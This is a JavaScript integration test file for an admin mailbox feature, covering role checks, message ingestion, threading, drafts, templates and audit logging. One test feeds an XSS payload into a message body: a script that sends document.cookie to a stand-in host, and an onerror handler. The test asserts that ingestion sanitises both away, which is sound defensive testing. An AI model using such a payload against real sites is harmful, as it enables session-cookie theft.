/**
 * Mail flows against a real database.
 *
 * Skipped unless DATABASE_URL is set, because these create real rows:
 *
 *   DATABASE_URL='postgres://...' npm test
 *
 * Everything is namespaced with a random per-run prefix and removed in the
 * `after` hook, so this is safe against a development database but not a
 * production one.
 *
 * The mail routes are mounted with a stubbed session instead of a real login:
 * the point here is the mail behaviour (ingestion, threading, read/star/trash,
 * drafts, templates, permissions), not the session machinery, which
 * admin-auth.test.mjs already covers.
 */
import { hasDatabase } from './helpers/env.mjs';
import test, { after, before } from 'node:test';
import assert from 'node:assert/strict';
import express from 'express';
import { createServer } from 'node:http';

const runId = Math.random().toString(36).slice(2, 10);
const prefix = `mail-test-${runId}`;

let server;
let baseUrl;
let adminId;
/** Mail rows live on the mailbox database; administrators live on the app one. */
let sql;
let appSql;

/** Roles the stubbed session will claim, keyed by the header the test sends. */
const ROLES = {
  owner: 'owner',
  admin: 'admin',
  moderator: 'moderator',
};

before(async () => {
  if (!hasDatabase) return;

  const { default: postgres } = await import('postgres');

  const { ensureMailSchema, mailDatabaseUrl } = await import('../api/lib/mail-store.js');
  const { normalizeDatabaseUrl } = await import('../api/lib/db.js');

  sql = postgres(normalizeDatabaseUrl(mailDatabaseUrl()), { ssl: 'require', max: 3 });
  appSql = postgres(normalizeDatabaseUrl(process.env.DATABASE_URL), { ssl: 'require', max: 3 });

  // The mail tables reference admin_credentials, so it has to exist first. On a
  // split deployment that table lives on the application database.
  await appSql`
    CREATE TABLE IF NOT EXISTS admin_credentials (
      id uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
      email text UNIQUE,
      pin text NOT NULL UNIQUE,
      password_hash text NOT NULL,
      role text DEFAULT 'moderator' NOT NULL,
      updated_at timestamp DEFAULT now() NOT NULL
    )
  `;
  await ensureMailSchema();

  const [admin] = await appSql`
    INSERT INTO admin_credentials (email, pin, password_hash, role)
    VALUES (${`${prefix}@example.test`}, ${`pin-${runId}`}, ${'x'.repeat(60)}, ${'admin'})
    RETURNING id
  `;
  adminId = admin.id;

  const { buildMailRouter } = await import('../api/lib/mail-routes.js');

  // A stub session guard: the real ones live in api/admin/index.js and are
  // covered elsewhere. What matters here is that the router consults them.
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    const role = req.headers['x-test-role'];
    req.session = role ? { isAdminLoggedIn: true, adminId, adminRole: role } : {};
    next();
  });
  app.use(
    buildMailRouter({
      requireAuth: (req, res, next) =>
        req.session?.isAdminLoggedIn ? next() : res.status(401).json({ message: 'Not authenticated' }),
      requireRole: (minimum) => (req, res, next) => {
        const order = { moderator: 1, admin: 2, owner: 3 };
        const have = order[req.session?.adminRole] || 0;
        return have >= order[minimum] ? next() : res.status(403).json({ message: 'Insufficient permissions' });
      },
      adminIdFrom: (req) => req.session?.adminId,
    }),
  );

  server = createServer(app);
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  baseUrl = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  if (!hasDatabase) return;
  await new Promise((resolve) => server?.close(resolve));
  // On a shared database ON DELETE CASCADE removes every mail row. On a split
  // database the cascade cannot reach the mailbox, so clean up explicitly.
  await appSql`DELETE FROM admin_credentials WHERE id = ${adminId}`;
  const { purgeAdminMailData } = await import('../api/lib/mail-store.js');
  await purgeAdminMailData(adminId);
  await sql.end();
  await appSql.end();
});

const call = async (method, path, { role = 'admin', body } = {}) => {
  const response = await fetch(`${baseUrl}${path}`, {
    method,
    headers: {
      ...(role ? { 'x-test-role': role } : {}),
      ...(body ? { 'Content-Type': 'application/json' } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await response.text();
  let payload = null;
  try {
    payload = text ? JSON.parse(text) : null;
  } catch {
    payload = text;
  }
  return { status: response.status, payload };
};

/* ------------------------------------------------------------------ access */

test('a logged-out request is refused with 401', { skip: !hasDatabase }, async () => {
  const { status } = await call('GET', '/api/admin/mail/counts', { role: null });
  assert.equal(status, 401);
});

test('a moderator is refused with 403 on every mail surface', { skip: !hasDatabase }, async () => {
  const paths = [
    ['GET', '/api/admin/mail/counts'],
    ['GET', '/api/admin/mail/messages'],
    ['GET', '/api/admin/mail/drafts'],
    ['GET', '/api/admin/mail/templates'],
    ['GET', '/api/admin/mail/signature'],
    ['GET', '/api/admin/mail/notifications'],
    ['POST', '/api/admin/mail/send'],
    ['POST', '/api/admin/mail/drafts'],
    ['POST', '/api/admin/mail/push/subscribe'],
  ];
  for (const [method, path] of paths) {
    const { status } = await call(method, path, { role: 'moderator' });
    assert.equal(status, 403, `${method} ${path} must deny a moderator`);
  }
});

test('an admin and an owner are both allowed', { skip: !hasDatabase }, async () => {
  for (const role of ['admin', 'owner']) {
    const { status } = await call('GET', '/api/admin/mail/counts', { role });
    assert.equal(status, 200, `${role} must be allowed`);
  }
});

/* --------------------------------------------------------------- ingestion */

test('an inbound message lands in the inbox, unread, and is idempotent', { skip: !hasDatabase }, async () => {
  const { ingestMessage, listMessages, getMailCounts } = await import('../api/lib/mail-store.js');

  const first = await ingestMessage({
    providerMessageId: `${prefix}-resend-1`,
    direction: 'inbound',
    status: 'received',
    fromName: 'John Doe',
    fromEmail: `${prefix}-john@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Project Request`,
    bodyHtml: '<p>I would like to discuss a project.</p>',
    bodyText: 'I would like to discuss a project.',
    provider: 'resend',
    sourceType: 'contact',
    sentAt: new Date(),
  });
  assert.ok(first.id, 'ingestion returns the created message id');

  // The same provider id must not create a second row.
  const second = await ingestMessage({
    providerMessageId: `${prefix}-resend-1`,
    fromEmail: `${prefix}-john@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Project Request`,
    bodyText: 'I would like to discuss a project.',
  });
  assert.equal(second.duplicate, true, 'a repeated provider id is recognised as a duplicate');
  assert.equal(second.id, first.id, 'and resolves to the same message');

  const counts = await getMailCounts();
  assert.ok(counts.inbox >= 1, 'the unead inbox count includes the new message');

  const list = await listMessages({ view: 'inbox', page: 1, pageSize: 50 });
  const row = list.rows.find((item) => item.id === first.id);
  assert.ok(row, 'the ingested message appears in the inbox list');
  assert.equal(row.isRead, false, 'a new inbound message starts unread');
  // The list must carry a preview, not the body.
  assert.ok(!('bodyHtml' in row) && !('body' in row), 'the list row must not carry the full body');
  assert.ok(row.snippet, 'the list row carries a snippet');
});

test('a malicious body is sanitised at ingestion, not at render', { skip: !hasDatabase }, async () => {
  const { ingestMessage, getMessage } = await import('../api/lib/mail-store.js');

  const created = await ingestMessage({
    providerMessageId: `${prefix}-xss-1`,
    direction: 'inbound',
    fromEmail: `${prefix}-attacker@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} XSS attempt`,
    bodyHtml: '<p>hello</p><script>fetch("https://evil.test?c="+document.cookie)</script><img src=x onerror="alert(1)">',
    provider: 'resend',
  });

  const stored = await getMessage(created.id);
  assert.ok(!/<script/i.test(stored.html || ''), 'the stored html has no script tag');
  assert.ok(!/onerror/i.test(stored.html || ''), 'the stored html has no event handler');
  assert.ok(!/evil\.test/.test(stored.html || ''), 'the exfiltration payload is gone');
  assert.ok(/hello/.test(stored.html || ''), 'the legitimate content survives');
});

/* --------------------------------------------------------------- threading */

test('a reply joins the existing thread instead of starting a new one', { skip: !hasDatabase }, async () => {
  const { ingestMessage, getThreadMessages, listMessages } = await import('../api/lib/mail-store.js');

  const original = await ingestMessage({
    providerMessageId: `${prefix}-thread-root`,
    direction: 'inbound',
    fromEmail: `${prefix}-client@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Thread topic`,
    bodyText: 'Initial request',
    provider: 'resend',
  });

  const reply = await ingestMessage({
    providerMessageId: `${prefix}-thread-reply`,
    threadId: original.threadId,
    direction: 'outbound',
    status: 'sent',
    fromEmail: `${prefix}-owner@example.test`,
    to: [`${prefix}-client@example.test`],
    subject: `Re: ${prefix} Thread topic`,
    bodyText: 'Our response',
    provider: 'mailjet',
    inReplyTo: original.id,
    sentAt: new Date(),
  });

  assert.equal(reply.threadId, original.threadId, 'the reply reuses the original thread');

  const thread = await getThreadMessages(original.threadId);
  assert.equal(thread.messages.length, 2, 'the thread holds both messages');
  assert.equal(thread.messages[0].direction, 'inbound', 'messages are ordered oldest first');

  const list = await listMessages({ view: 'inbox', page: 1, pageSize: 50 });
  const row = list.rows.find((item) => item.threadId === original.threadId);
  assert.ok(row.messageCount >= 2, 'the list row reports the thread message count');
});

/* --------------------------------------------------------- flags and views */

test('read, star and trash flags survive a round trip', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const created = await store.ingestMessage({
    providerMessageId: `${prefix}-flags`,
    direction: 'inbound',
    fromEmail: `${prefix}-flags@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Flags`,
    bodyText: 'flags',
    provider: 'resend',
  });

  await store.setMessageRead(created.id, true);
  assert.equal((await store.getMessage(created.id)).isRead, true, 'read flag persists');

  await store.setMessageStar(created.id, true, { thread: true });
  assert.equal((await store.getMessage(created.id)).isStarred, true, 'star flag persists');

  await store.setMessageTrashed(created.id, true);
  assert.equal((await store.getMessage(created.id)).isTrashed, true, 'trash flag persists');

  const inbox = await store.listMessages({ view: 'inbox', page: 1, pageSize: 50 });
  assert.ok(!inbox.rows.some((row) => row.id === created.id), 'a trashed message leaves the inbox');

  const trash = await store.listMessages({ view: 'trash', page: 1, pageSize: 50 });
  assert.ok(trash.rows.some((row) => row.id === created.id), 'and appears in trash');

  // Restoring puts it back.
  await store.setMessageTrashed(created.id, false);
  const restored = await store.listMessages({ view: 'inbox', page: 1, pageSize: 50 });
  assert.ok(restored.rows.some((row) => row.id === created.id), 'restoring returns it to the inbox');
});

test('unread and attachment filters narrow the list', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  await store.ingestMessage({
    providerMessageId: `${prefix}-filter-unread`,
    direction: 'inbound',
    fromEmail: `${prefix}-filter@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Unread filter`,
    bodyText: 'unread',
    provider: 'resend',
    isRead: false,
  });

  const unread = await store.listMessages({ view: 'inbox', filters: { unread: true }, page: 1, pageSize: 50 });
  assert.ok(unread.rows.length > 0, 'the unread filter returns rows');
  assert.ok(unread.rows.every((row) => !row.isRead), 'every returned row is unread');
});

test('search matches subject and body server-side', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');
  const needle = `zebra-${runId}`;

  await store.ingestMessage({
    providerMessageId: `${prefix}-search`,
    direction: 'inbound',
    fromEmail: `${prefix}-search@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} ${needle} subject`,
    bodyText: `${needle} in the body`,
    provider: 'resend',
  });

  const bySubject = await store.listMessages({ view: 'inbox', search: needle, page: 1, pageSize: 50 });
  assert.ok(bySubject.rows.length >= 1, 'search finds the message by subject');

  const byBody = await store.listMessages({ view: 'inbox', search: 'in the body', page: 1, pageSize: 50 });
  assert.ok(byBody.rows.some((row) => row.subject?.includes(needle)), 'search also scans the body');
});

test('pagination is bounded and slices the result set', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const page1 = await store.listMessages({ view: 'inbox', page: 1, pageSize: 1 });
  assert.equal(page1.rows.length, 1, 'a page size of one returns one row');

  // An absurd page size must be clamped rather than honoured.
  const huge = await store.listMessages({ view: 'inbox', page: 1, pageSize: 100000 });
  assert.ok(huge.rows.length <= 100, 'the page size is clamped to the maximum');
});

/* ----------------------------------------------------------------- drafts */

test('a draft is created, updated in place and deleted', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const created = await store.saveDraft({
    adminId,
    to: [`${prefix}-draft@example.test`],
    subject: `${prefix} Draft`,
    bodyHtml: '<p>half written</p>',
  });

  const updated = await store.saveDraft({
    id: created.id,
    adminId,
    to: [`${prefix}-draft@example.test`],
    subject: `${prefix} Draft v2`,
    bodyHtml: '<p>finished</p>',
  });
  assert.equal(updated.id, created.id, 'a re-save updates the same draft');

  const mine = await store.listDrafts(adminId);
  const draft = mine.find((row) => row.id === created.id);
  assert.equal(draft.subject, `${prefix} Draft v2`, 'the newest content wins');
  assert.equal(mine.filter((row) => row.id === created.id).length, 1, 'no duplicate draft row');

  await store.deleteDraft(created.id, adminId);
  const afterDelete = await store.listDrafts(adminId);
  assert.ok(!afterDelete.some((row) => row.id === created.id), 'the draft is gone');
});

test("one admin cannot read or delete another admin's draft", { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const [other] = await appSql`
    INSERT INTO admin_credentials (email, pin, password_hash, role)
    VALUES (${`${prefix}-other@example.test`}, ${`pin-other-${runId}`}, ${'x'.repeat(60)}, ${'admin'})
    RETURNING id
  `;

  const draft = await store.saveDraft({ adminId, subject: `${prefix} Private draft`, bodyHtml: '<p>secret</p>' });

  const stolen = await store.getDraft(draft.id, other.id);
  assert.equal(stolen, null, "another admin's draft is not returned");

  const otherDrafts = await store.listDrafts(other.id);
  assert.ok(!otherDrafts.some((row) => row.id === draft.id), "and it is absent from their list");

  // Deleting through the wrong admin must be a no-op, not a success.
  await store.deleteDraft(draft.id, other.id);
  assert.ok((await store.getDraft(draft.id, adminId)) !== null, 'the owner still has the draft');

  await appSql`DELETE FROM admin_credentials WHERE id = ${other.id}`;
});

/* -------------------------------------------------------------- templates */

test('templates can be created, duplicated and deleted', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const created = await store.createTemplate({
    name: `${prefix} Welcome`,
    category: 'welcome',
    subject: 'Welcome to ProjectHub',
    bodyHtml: '<p>Welcome!</p>',
    createdBy: adminId,
  });

  const copy = await store.duplicateTemplate(created.id, adminId);
  assert.notEqual(copy.id, created.id, 'the copy is a distinct row');
  assert.match(copy.name, /copy/i, 'the copy is named as a copy');

  const all = await store.listTemplates();
  assert.ok(all.some((row) => row.id === created.id), 'the template is listed');

  await store.deleteTemplate(created.id);
  const remaining = await store.listTemplates();
  assert.ok(!remaining.some((row) => row.id === created.id), 'the template is deleted');

  await store.deleteTemplate(copy.id);
});

/* -------------------------------------------------------------- signature */

test('a signature is stored per admin and never shared', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  await store.saveSignature(adminId, {
    name: 'Shilpi',
    position: 'Founder',
    company: 'ProjectHub',
    website: 'projecthub.example',
    socialLinks: { GitHub: 'https://github.com/example' },
    enabled: true,
  });

  const mine = await store.getSignature(adminId);
  assert.equal(mine.name, 'Shilpi');
  assert.equal(mine.socialLinks.GitHub, 'https://github.com/example');

  const [other] = await appSql`
    INSERT INTO admin_credentials (email, pin, password_hash, role)
    VALUES (${`${prefix}-sig@example.test`}, ${`pin-sig-${runId}`}, ${'x'.repeat(60)}, ${'admin'})
    RETURNING id
  `;
  const theirs = await store.getSignature(other.id);
  // No row means no signature, which is the correct isolation: one admin's
  // signature is never served to another.
  assert.equal(theirs, null, "another admin's signature is not exposed");
  await appSql`DELETE FROM admin_credentials WHERE id = ${other.id}`;
});

/* ---------------------------------------------------------- notifications */

test('a notification holds a preview, never a body', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const created = await store.ingestMessage({
    providerMessageId: `${prefix}-notify`,
    direction: 'inbound',
    fromEmail: `${prefix}-notify@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Notify`,
    bodyHtml: `<p>${'x'.repeat(400)}</p>`,
    bodyText: 'y'.repeat(400),
    provider: 'resend',
  });

  await store.createMailNotifications({
    type: 'new_email',
    title: `${prefix} Notify`,
    preview: 'z'.repeat(400),
    messageId: created.id,
    threadId: created.threadId,
  });

  const rows = await sql`
    SELECT title, body_preview FROM mail_notifications WHERE message_id = ${created.id} LIMIT 1
  `;
  assert.equal(rows.length, 1, 'a notification row was written');
  assert.ok(rows[0].body_preview.length <= 160, 'the preview is truncated');

  // The table must not even have a column that could hold a body.
  const columns = await sql`
    SELECT column_name FROM information_schema.columns WHERE table_name = 'mail_notifications'
  `;
  const names = columns.map((row) => row.column_name);
  assert.ok(!names.includes('body_html') && !names.includes('body_text'),
    'notification rows must not be able to store a message body');
});

test('notification preferences are per admin', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  await store.saveNotificationSettings(adminId, { notifyNewEmail: false, soundEnabled: true });
  const mine = await store.getNotificationSettings(adminId);
  assert.equal(mine.notifyNewEmail, false);

  const [other] = await appSql`
    INSERT INTO admin_credentials (email, pin, password_hash, role)
    VALUES (${`${prefix}-pref@example.test`}, ${`pin-pref-${runId}`}, ${'x'.repeat(60)}, ${'admin'})
    RETURNING id
  `;
  const theirs = await store.getNotificationSettings(other.id);
  assert.equal(theirs.notifyNewEmail, true, "another admin's preference is untouched");
  await appSql`DELETE FROM admin_credentials WHERE id = ${other.id}`;
});

/* ------------------------------------------------- default insert surface */

test('a new message defaults to unread and in no trash', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  const created = await store.ingestMessage({
    providerMessageId: `${prefix}-defaults`,
    fromEmail: `${prefix}-defaults@example.test`,
    to: [`${prefix}-owner@example.test`],
    subject: `${prefix} Defaults`,
    bodyText: 'defaults',
    provider: 'resend',
    // isRead and isTrashed are deliberately omitted.
  });

  const stored = await store.getMessage(created.id);
  assert.equal(stored.isRead, false, 'is_read must default to false');
  assert.equal(stored.isTrashed, false, 'is_trashed must default to false');
  assert.equal(stored.isStarred, false, 'is_starred must default to false');
});

/* -------------------------------------------------------------- audit log */

test('sent sends are recorded in the audit log without a body or secret', { skip: !hasDatabase }, async () => {
  const store = await import('../api/lib/mail-store.js');

  await store.recordAudit(adminId, 'mail.sent', {
    targetType: 'message',
    targetId: null,
    details: { recipients: 2, attachments: 0 },
  });

  const rows = await sql`
    SELECT action, details FROM mail_audit_log WHERE admin_id = ${adminId} AND action = 'mail.sent' LIMIT 1
  `;
  assert.equal(rows.length, 1, 'the action was recorded');
  const serialised = JSON.stringify(rows[0]);
  assert.ok(!/apikey|api_key|password|secret/i.test(serialised), 'no credential is written to the audit log');
});
